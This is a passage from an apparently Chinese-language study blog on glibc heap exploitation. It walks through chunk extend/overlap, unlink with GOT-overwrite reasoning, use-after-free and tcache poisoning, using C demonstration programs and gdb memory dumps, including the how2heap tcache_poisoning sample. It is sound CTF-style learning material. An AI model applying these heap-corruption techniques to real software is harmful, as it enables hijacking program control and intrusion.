class="number">0x0000000000000021</span> &lt;=== chunk2</span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== 防止合并的chunk</span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f31</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;=== 被放入unsorted bin</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span> &lt;=== fd，bk</span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x00000000000000b0</span>  <span class="number">0x0000000000000020</span> &lt;=== 注意此处标记为空</span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f31</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[+] unsorted_bins[0]: <span class="attribute">fw</span>=0x602000, <span class="attribute">bk</span>=0x602000</span><br><span class="line"> →   Chunk(<span class="attribute">addr</span>=0x602010, <span class="attribute">size</span>=0xb0, <span class="attribute">flags</span>=PREV_INUSE)</span><br></pre></td></tr></table></figure>

<p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">    <span class="number">0x4005b0</span> &lt;main+<span class="number">74</span>&gt;        <span class="keyword">call</span>   <span class="number">0x400450</span> &lt;malloc@plt&gt;</span><br><span class="line">→   <span class="number">0x4005b5</span> &lt;main+<span class="number">79</span>&gt;        <span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x8</span>], <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">rax</span> : <span class="number">0x0000000000602010</span></span><br></pre></td></tr></table></figure>

<h4 id="类型3-对-free-的-smallbin-进行-extend"><a href="#类型3-对-free-的-smallbin-进行-extend" class="headerlink" title="类型3-对 free 的 smallbin 进行 extend"></a>类型3-对 free 的 smallbin 进行 extend</h4><p>这个类型的利用是在第二种类型的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两次 malloc 之后的结果如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span> &lt;=== chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span></span><br></pre></td></tr></table></figure>

<p>我们首先释放 chunk1 使它进入 unsorted bin 中：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">     unsorted_bins[<span class="number">0</span>]: fw=<span class="number">0x602000</span>, bk=<span class="number">0x602000</span></span><br><span class="line"> →   Chunk(addr=<span class="number">0x602010</span>, size=<span class="number">0x90</span>, flags=PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span> &lt;=== 进入unsorted bin</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span> &lt;=== fd，bk</span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure>

<p>然后篡改 chunk1 的 size 域：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;=== size域被篡改</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span></span><br></pre></td></tr></table></figure>

<p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p>
<h4 id="Chunk-Extend-Shrink-可以做什么"><a href="#Chunk-Extend-Shrink-可以做什么" class="headerlink" title="Chunk Extend/Shrink 可以做什么?"></a>Chunk Extend/Shrink 可以做什么?</h4><p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p>
<p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p>
<h4 id="类型4-通过-extend-后向-overlapping"><a href="#类型4-通过-extend-后向-overlapping" class="headerlink" title="类型4-通过 extend 后向 overlapping"></a>类型4-通过 extend 后向 overlapping</h4><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x10 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
<h4 id="类型5-通过-extend-前向-overlapping"><a href="#类型5-通过-extend-前向-overlapping" class="headerlink" title="类型5-通过 extend 前向 overlapping"></a>类型5-通过 extend 前向 overlapping</h4><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>
<h3 id="Unlink-没搞特别懂"><a href="#Unlink-没搞特别懂" class="headerlink" title="Unlink(没搞特别懂)"></a>Unlink(没搞特别懂)</h3><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p>
<p><code>unlink</code>操作就是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下：</p>
<p><img src="http://ggb0n.cool/images/heap1.png" alt=""></p>
<h4 id="古老的unlink"><a href="#古老的unlink" class="headerlink" title="古老的unlink"></a>古老的unlink</h4><p>在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>

<p><strong>这里我们以 32 位为例</strong>，假设堆内存最初的布局是下面的样子：</p>
<p><img src="http://ggb0n.cool/images/heap2.png" alt=""></p>
<p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时：</p>
<ul>
<li>1、glibc 判断这个块是 small chunk</li>
<li>2、判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li>
<li>3、判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li>
<li>4、继而对 Nextchunk 采取 unlink 操作</li>
</ul>
<p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下：</p>
<ul>
<li>1、FD=P-&gt;fd = target addr -12</li>
<li>2、BK=P-&gt;bk = expect value</li>
<li>3、FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li>
<li>4、BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li>
</ul>
<p>我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要<strong>确保 expect value +8 地址具有可写的权限。</strong></p>
<p>比如说我们将<code>target addr</code>设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。<strong>需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。</strong></p>
<h4 id="当前的unlink"><a href="#当前的unlink" class="headerlink" title="当前的unlink"></a>当前的unlink</h4><p>刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br></pre></td></tr></table></figure>

<p>此时：</p>
<ul>
<li>FD-&gt;bk = target addr - 12 + 12=target_addr</li>
<li>BK-&gt;fd = expect value + 8</li>
</ul>
<p>那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是我们可以通过伪造的方式绕过这个机制。</p>
<p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要：</p>
<ul>
<li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li>
<li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li>
</ul>
<p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p>
<ul>
<li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li>
<li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li>
</ul>
<p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p>
<ul>
<li><code>*P = P - 8</code></li>
<li><code>*P = P - 12</code></li>
</ul>
<p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p>
<p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可：</p>
<p><img src="http://ggb0n.cool/images/heap3.png" alt=""></p>
<p>需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br></pre></td></tr></table></figure>

<p>此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。</p>
<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
<li><p>1、条件</p>
<ul>
<li>UAF ，可修改 free 状态下 small bin 或是 unsorted bin 的 fd 和 bk 指针</li>
<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>
</ul>
</li>
<li><p>2、效果<br>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>
</li>
<li><p>3、思路<br>设指向可 UAF chunk 的指针的地址为 ptr：</p>
<ul>
<li>修改 fd 为 ptr - 0x18</li>
<li>修改 bk 为 ptr - 0x10</li>
<li>触发 unlink</li>
</ul>
<p>ptr 处的指针会变为 ptr - 0x18。</p>
</li>
</ul>
<h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h3><h4 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p>
<ul>
<li>1、内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃；</li>
<li>2、内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>；</li>
<li>3、内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p>而我们一般所指的<code>Use After Free</code>漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为<code>dangling pointer</code>。</p>
<p>一个简单的示例代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"call print my name\n"</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">"I can also use it"</span>;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">"I can also use it"</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"this pogram will crash...\n"</span>);</span><br><span class="line">  a-&gt;func(<span class="string">"can not be printed..."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">➜  use_after_free git:(use_after_free) ✗ ./use_after_free                     </span><br><span class="line">this is my <span class="function"><span class="keyword">function</span></span></span><br><span class="line">I can also <span class="keyword">use</span> it</span><br><span class="line"><span class="keyword">call</span> <span class="built_in">print</span> my <span class="keyword">name</span></span><br><span class="line">this pogram will crash...</span><br><span class="line">[<span class="number">1</span>]    <span class="number">38738</span> segmentation fault (core dumped)  ./use_after_free</span><br></pre></td></tr></table></figure>

<p>可见被free掉的chunk又被成功访问了。</p>
<h3 id="Tcache-Attack"><a href="#Tcache-Attack" class="headerlink" title="Tcache Attack"></a>Tcache Attack</h3><p>tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。对 tcache 的深入认识去<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache-zh/#tcache">这里</a>。这里主要记录一下如何 PWN tcache。</p>
<h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h4><p>即 tcache 污染，通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。以 how2heap 中的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">tcache_poisoning</a> 为例，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"</span></span><br><span class="line">		   <span class="string">"returning a pointer to an arbitrary location (in this case, the stack).\n"</span></span><br><span class="line">		   <span class="string">"The attack is very similar to fastbin corruption attack.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"</span></span><br><span class="line">		   <span class="string">"We have to create and free one more chunk for padding before fd pointer hijacking.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 2 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line">	<span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the buffers...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"</span></span><br><span class="line">		   <span class="string">"to point to the location to control (%p).\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p ].\n"</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(128): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span 